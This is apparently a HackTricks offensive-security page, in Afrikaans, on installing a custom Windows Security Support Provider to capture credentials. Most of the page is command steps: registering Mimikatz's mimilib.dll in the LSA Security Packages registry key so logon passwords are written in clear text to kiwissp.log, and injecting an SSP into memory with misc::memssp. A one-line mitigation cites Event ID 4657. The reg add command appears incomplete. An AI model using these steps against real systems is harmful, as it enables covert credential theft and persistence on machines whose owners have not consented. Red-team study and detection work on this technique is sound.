# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Leer hier wat ’n SSP (Security Support Provider) is.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **credentials** wat gebruik word om toegang tot die masjien te verkry, in **clear text** te **capture**.

#### Mimilib

Jy kan die `mimilib.dll`-binary gebruik wat deur Mimikatz verskaf word. **Dit sal al die credentials in clear text binne ’n lêer log.**\
Plaas die dll in `C:\Windows\System32\`\
Kry ’n lys van bestaande LSA Security Packages:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Voeg `mimilib.dll` by die lys van Security Support Providers (Security Packages) by:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
En ná ’n herlaai kan alle geloofsbriewe in duidelike teks gevind word in `C:\Windows\System32\kiwissp.log`

#### In geheue

Jy kan dit ook direk in geheue inject deur Mimikatz te gebruik (let daarop dat dit ’n bietjie onstabiel kan wees/nie kan werk nie):
```bash
privilege::debug
misc::memssp
```
Dit sal nie herselflaaie oorleef nie.

#### Versagting

Event ID 4657 - Oudit van die skepping/wysiging van `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
